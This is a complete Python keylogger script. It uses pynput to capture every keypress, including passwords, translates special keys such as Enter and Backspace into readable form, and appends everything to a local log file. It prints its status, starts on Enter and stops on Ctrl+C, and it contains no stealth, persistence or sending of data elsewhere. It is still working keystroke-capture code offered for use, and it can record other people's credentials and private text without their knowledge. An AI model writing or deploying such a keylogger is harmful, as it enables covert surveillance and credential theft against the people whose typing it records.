import os
from pynput.keyboard import Listener

# Configuration
LOG_FILE = "keylog.txt"
LOG_DIRECTORY = "logs"

# Ensure the log directory exists
if not os.path.exists(LOG_DIRECTORY):
    os.makedirs(LOG_DIRECTORY)

LOG_FILE_PATH = os.path.join(LOG_DIRECTORY, LOG_FILE)

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.listener = None

    def log_key(self, key):
        """
        Callback function to handle keypress events.
        Logs the key into the specified file.
        """
        try:
            # Attempt to get the key's character representation
            key_str = key.char if hasattr(key, 'char') else str(key).replace("Key.", "")
        except Exception as e:
            key_str = f"[Error: {e}]"

        # Map special keys to readable representations
        key_str = {
            'space': ' ',
            'enter': '\n',
            'backspace': '[Backspace]',
            'tab': '[Tab]',
            'shift': '[Shift]',
            'ctrl': '[Ctrl]',
            'alt': '[Alt]',
            'esc': '[Escape]'
        }.get(key_str, key_str)

        # Append the key to the log file
        try:
            with open(self.log_file, "a") as file:
                file.write(key_str)
                # Add a new line after enter for better readability
                if key_str == '\n':
                    file.write('\n')
        except IOError as io_err:
            print(f"Error writing to log file: {io_err}")

    def start(self):
        """
        Starts the keylogger by listening to keyboard events.
        """
        print(f"Keylogger started. Logging to '{self.log_file}'")
        print("Press Ctrl+C to stop the program.")

        # Start the listener
        self.listener = Listener(on_press=self.log_key)
        self.listener.start()

        # Keep the program running until interrupted
        try:
            while True:
                pass  # Infinite loop to keep the program running
        except KeyboardInterrupt:
            print("\nStopping keylogger...")
            self.stop()

    def stop(self):
        """
        Stops the keylogger gracefully.
        """
        if self.listener is not None:
            self.listener.stop()
            self.listener.join()
        print("Keylogger stopped.")

if __name__ == "__main__":
    # Prompt to start keylogger
    print("Press Enter to start the keylogger.")
    input()  # Wait for Enter key press

    # Initialize and start the keylogger
    keylogger = Keylogger(log_file=LOG_FILE_PATH)
    keylogger.start()
